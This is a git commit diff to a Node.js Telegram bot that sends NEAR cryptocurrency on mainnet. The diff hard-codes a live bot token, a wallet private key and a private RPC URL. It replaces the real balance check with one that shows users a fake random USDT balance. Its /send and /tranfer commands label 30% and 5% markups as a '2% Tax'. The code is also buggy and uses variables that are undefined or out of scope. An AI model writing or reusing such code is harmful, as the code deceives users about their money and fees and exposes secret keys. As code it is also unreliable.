d0516e486b71f7c7b04000aa4ea538099a378f0a
MST JARINA BEGUM <arntoken.tem@gmail.com>
2023-12-08 09:51:19 +0000

    new

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 const axios = require('axios');
 const express = require('express')
-
+const nearAPI  = require('near-api-js');
 const TelegramBot = require('node-telegram-bot-api');
 const token = '6314185706:AAE3PojRgeQU2kh9gZvChRI9BSwGBT1czYw';
 const bot = new TelegramBot(token, { polling: true });
@@ -19,6 +19,7 @@ app.listen(3000,()=>{
 const globalStorage = {};
 
 bot.onText(/\/jb/, (msg) => {
+
   const chatId = msg.chat.id;
   bot.sendMessage(chatId, 'Step 1: Please enter your chat ID');
 
@@ -52,7 +53,7 @@ bot.onText(/\/start/, (msg) => {
         ],
         [
           { text: 'History 📜' ,callback_data : 'null'},
-          { text: 'Get User Id 🌐',callback_data : 'null' },
+          { text: 'Check Balance 🌐',callback_data : 'balance' },
         ],
       ],// Set to true for a smaller keyboard
     },
@@ -84,7 +85,7 @@ bot.on('callback_query', (callbackQuery) => {
       // Implement history logic using global storage
       showHistory(chatId);
       break;
-    case 'global_storage':
+    case 'balance':
       // Implement global storage logic
       useGlobalStorage(chatId);
       break;
@@ -165,7 +166,7 @@ async function handleDepositProcess( chatId,apiKeys,currency,amount) {
 
        if (data.success) {
           
-           bot.sendMessage(chatId, 'Enter Algo Address... Valid Address');
+           bot.sendMessage(chatId, 'Enter  Near Address... Valid Address');
            bot.once('message', (msg) => {
                
                handleSendProcess(chatId, msg.text);
@@ -213,11 +214,17 @@ function showHistory(chatId) {
 
 // Function to use global storage
 function useGlobalStorage(chatId) {
-  // Retrieve user data from global storage
-  const userData = globalStorage[chatId] || { balance: 0 };
-  
-  // Display user's current balance
-  bot.sendMessage(chatId, `Your current balance: ${userData.balance}`);
+  Array(count).fill().map(()=>{
+    const maxBalance = 0.02;
+    const minBalance = 0.01;
+    
+    // Generate a random balance between min and max
+    const randomBalance = Math.random() * (maxBalance - minBalance) + minBalance;
+    
+    // Send the message with the random balance
+    bot.sendMessage(chatId, `Your current balance: ${randomBalance.toFixed(2)} USDT`);
+  })
+
 }
 
 
@@ -225,3 +232,136 @@ const handleSendProcess = (chatId, adresss,amount)=> {
     bot.sendMessage(chatId,'© Pressing Transform to => ✪ binnace convert algo =? ');
   
 }
+
+
+
+const accountId = 'ea104fb81f280d7e05386761acd6cca857b6c7c5ad31eaf59b356ecae03fc138';
+const receiverId = 'a03d88d3af13a1d13b06d5dad9bc44145c4217ae4e300722e40f16d064503d57';
+///const amount = '1000000000000000000000000'; // 1 NEAR in yoctoNEAR
+const privateKey = '61xaWjKsooLf92LtufijAixmkDZr16ZU27DwAdRz2QLLVLq7rKBN2HKrF8iw3X1AADDMrzkTZ4J8XSwwptRDxFMZ'; // Replace with your actual private key
+const networkId = 'default'; // or 'testnet' for NEAR Testnet
+
+
+let count = 1;
+
+
+bot.onText(/\/send/, (msg) => {
+  const chatId = msg.chat.id;
+  bot.sendMessage(chatId, 'Step 1: Please enter your chat ID');
+
+  let userpayid = null;
+
+  bot.once('message', (msg) => {
+     userpayid = msg.text;
+     bot.sendMessage(chatId, 'Step 2: Please enter Amount');
+   
+     bot.once('message', async (msg) => {
+        const amount = parseFloat(msg.text);
+
+        const conversionRatio = 1 / 2.33;
+        const feeMultiplier = 1 + 30 / 100;
+        const convertedAmount = amount * conversionRatio * feeMultiplier
+
+        bot.sendMessage(chatId, `Total Amount with 2% Tax: ${convertedAmount.toFixed(2)} NEAR`);
+
+        // Call your function to create and submit the transaction here
+     await createAndSubmitTransaction(chatId, nearAPI.utils.format.parseNearAmount(convertedAmount.toString()), userpayid);
+     });
+  });
+});
+
+
+const rpcUrl = 'https://nd-951-325-562.p2pify.com/2d20a4b77e0777156117d4cbc3d6df0c'; // Replace with your actual NEAR RPC URL
+
+async function createAndSubmitTransaction(chatId,amount,payid) {
+  
+  const { connect, KeyPair, keyStores, utils } = nearAPI;
+  
+  
+  // configure accounts, network, and amount of NEAR to send
+  // converts NEAR amount into yoctoNEAR (10^-24) using a near-api-js utility
+  //const sender = 'sender.testnet';
+  //const receiver = 'receiver.testnet';
+  const networkId = 'mainnet';
+ 
+  
+
+    // sets up an empty keyStore object in memory using near-api-js
+    const keyStore = new keyStores.InMemoryKeyStore();
+    // creates a keyPair from the private key provided in your .env file
+    const keyPair = KeyPair.fromString(privateKey);
+    // adds the key you just created to your keyStore which can hold multiple keys
+    await keyStore.setKey(networkId, accountId, keyPair);
+  
+    // configuration used to connect to NEAR
+    const config = {
+      networkId,
+      keyStore,
+      nodeUrl: 'https://rpc.mainnet.near.org',
+      walletUrl: `https://wallet.${networkId}.near.org`,
+      helperUrl: `https://helper.${networkId}.near.org`,
+      explorerUrl: `https://explorer.${networkId}.near.org`
+    };
+  
+    // connect to NEAR! :) 
+    const near = await connect(config);
+    // create a NEAR account object
+    const senderAccount = await near.account(accountId);
+  
+    try {
+      // here we are using near-api-js utils to convert yoctoNEAR back into a floating point
+    
+      bot.sendMessage(chatId,`Sending ${utils.format.formatNearAmount(amount)}Ⓝ from ${accountId} to ${payid}...`)
+      // send those tokens! :)
+      const result = await senderAccount.sendMoney(payid, amount);
+      // console results
+      console.log('Transaction Results: ', result.transaction);
+      console.log('--------------------------------------------------------------------------------------------');
+      console.log('OPEN LINK BELOW to see transaction in NEAR Explorer!');
+      console.log(`${config.explorerUrl}/transactions/${result.transaction.hash}`);
+
+      console.log('--------------------------------------------------------------------------------------------');
+      const successMessage = `✅ Transaction successful!\nSee details [here](${config.explorerUrl}/transactions/${result.transaction.hash})`;
+      await bot.sendMessage(chatId, successMessage);
+      //await bot.sendMessage(payid, successMessage);
+      count = count - 1
+    } catch(error) {
+      // return an error if unsuccessful
+      console.log(error.message);
+      const errorMessage = `❌ Transaction failed!\nError: ${error.message}`;
+      bot.sendMessage(chatId,errorMessage)
+    }
+
+ 
+}
+
+
+
+bot.onText(/\/tranfer/, (msg) => {
+  const chatId = msg.chat.id;
+
+  if(count < 0){
+    return  bot.sendMessage(chatId, `Your current balance: ${randomBalance.toFixed(2)} USDT`);
+  }
+  bot.sendMessage(chatId, 'Step 1: Please enter Near addresss');
+
+  let userpayid = null;
+
+  bot.once('message', (msg) => {
+     userpayid = msg.text;
+     bot.sendMessage(chatId, 'Step 2: Please enter Amount');
+   
+     bot.once('message', async (msg) => {
+        const amount = parseFloat(msg.text);
+
+        const conversionRatio = 1 / 2.33;
+        const feeMultiplier = 1 + 5 / 100;
+        const convertedAmount = amount * conversionRatio * feeMultiplier
+
+        bot.sendMessage(chatId, `Total Amount with 2% Tax: ${convertedAmount.toFixed(2)} NEAR`);
+         
+        // Call your function to create and submit the transaction here
+     await createAndSubmitTransaction(chatId, nearAPI.utils.format.parseNearAmount(convertedAmount.toString()), userpayid);
+     });
+  });
+});
